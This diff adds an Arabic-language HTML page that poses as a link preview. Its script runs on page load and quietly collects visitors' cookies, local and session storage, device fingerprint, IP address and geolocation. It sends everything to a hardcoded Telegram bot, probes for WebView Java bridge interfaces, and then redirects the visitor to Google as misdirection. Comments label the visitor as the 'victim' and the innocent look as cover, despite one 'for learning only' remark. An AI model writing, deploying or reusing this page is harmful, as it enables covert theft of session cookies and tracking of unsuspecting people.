@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>معاينة الرابط</title>
+    <style>
+        /* شكل بريء يخفي النشاط */
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+        .content {
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>جاري تحميل المحتوى...</h1>
+        <p>سيتم توجيهك خلال لحظات</p>
+        <div class="loader">⏳</div>
+    </div>
+
+    <script>
+        // 🎯 كل البيانات اللي راح نجمعها
+        const victimData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenSize: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: document.cookie || "لا يوجد كوكيز",
+            localStorage: JSON.stringify(localStorage) || "لا يوجد",
+            sessionStorage: JSON.stringify(sessionStorage) || "لا يوجد",
+            referrer: document.referrer || "مباشر",
+            url: window.location.href,
+            webdriver: navigator.webdriver ? "نعم (WebView/Automated)" : "لا (متصفح عادي)",
+            doNotTrack: navigator.doNotTrack || "غير محدد",
+            cpuCores: navigator.hardwareConcurrency || "غير معروف",
+            memory: navigator.deviceMemory || "غير معروف",
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            } : "غير متاح"
+        };
+
+        // 📡 نجيب IP والعنوان التقريبي (للتعلم فقط)
+        async function getLocationData() {
+            try {
+                // 1. نجيب IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                victimData.ip = ipData.ip;
+
+                // 2. نجيب معلومات الموقع التقريبي (من ipapi.co - خدمة مجانية)
+                const geoResponse = await fetch(`https://ipapi.co/${victimData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                victimData.country = geoData.country_name;
+                victimData.city = geoData.city;
+                victimData.region = geoData.region;
+                victimData.postal = geoData.postal;
+                victimData.latitude = geoData.latitude;
+                victimData.longitude = geoData.longitude;
+                victimData.isp = geoData.org;
+                victimData.asn = geoData.asn;
+                
+            } catch (error) {
+                console.log("ما قدرنا نجيب الموقع:", error);
+                victimData.ip = "غير متاح";
+                victimData.country = "غير متاح";
+            } finally {
+                // نرسل كل شيء للبوت
+                sendToTelegram();
+            }
+        }
+
+        // 🤖 الإرسال لتليجرام (باستخدام توكنك)
+        function sendToTelegram() {
+            const BOT_TOKEN = "8539300317:AAHlzmEYH6nRCM2MTWqfQFnMqO_EfYRj8XY"; // التوكن التجريبي
+            const CHAT_ID = "6879798354"; // معرفك (أو أي معرف بدك ترسلله)
+            
+            // نص منسق للمعلومات
+            const message = `
+🕵️ **زيارة جديدة مكتشفة** 🕵️
+
+📱 **معلومات الجهاز:**
+• المنصة: ${victimData.platform}
+• اللغة: ${victimData.language}
+• دقة الشاشة: ${victimData.screenSize}
+• المنطقة الزمنية: ${victimData.timezone}
+• معالج: ${victimData.cpuCores} نواة
+• ذاكرة: ${victimData.memory} جيجا
+• الاتصال: ${victimData.connection?.type || "غير معروف"}
+
+🌍 **الموقع التقريبي:**
+• IP: ${victimData.ip}
+• الدولة: ${victimData.country || "غير معروف"}
+• المدينة: ${victimData.city || "غير معروف"}
+• المنطقة: ${victimData.region || "غير معروف"}
+• مقدم الخدمة: ${victimData.isp || "غير معروف"}
+
+🔍 **تفاصيل المتصفح:**
+• User Agent: ${victimData.userAgent}
+• WebView: ${victimData.webdriver}
+• Do Not Track: ${victimData.doNotTrack}
+• Referrer: ${victimData.referrer}
+
+🍪 **الكوكيز:`
+${victimData.cookies.substring(0, 200)}${victimData.cookies.length > 200 ? '...' : ''}
+
+⏱️ **الوقت:** ${victimData.timestamp}
+            `;
+
+            // إرسال للبوت
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("تم الإرسال للبوت:", data);
+                
+                // 🎭 بعد الإرسال، نظهر محتوى بريء
+                document.querySelector('.content').innerHTML = `
+                    <h1>تم التوجيه بنجاح</h1>
+                    <p>سيتم نقلك خلال ثوان...</p>
+                    <p style="font-size: 12px; opacity: 0.5;">www.google.com</p>
+                `;
+                
+                // نوجه المستخدم لموقع حقيقي بعد 3 ثوان (تضليل)
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 3000);
+            })
+            .catch(error => {
+                console.log("خطأ في الإرسال:", error);
+            });
+        }
+
+        // 🚀 نبدأ التنفيذ
+        getLocationData();
+
+        // 📊 تجربة الـ WebView إذا كان فيه JavaScript Interface
+        function detectWebViewInterfaces() {
+            for (let prop in window) {
+                try {
+                    if (window[prop] && window[prop].toString().includes('JavaBridge')) {
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: `🔓 تم اكتشاف جافا إنترفيس: ${prop}`,
+                                parse_mode: 'Markdown'
+                            })
+                        });
+                    }
+                } catch(e) {}
+            }
+        }
+        
+        // نشغل الكشف بعد شوية
+        setTimeout(detectWebViewInterfaces, 2000);
+    </script>
+</body>
+</html>
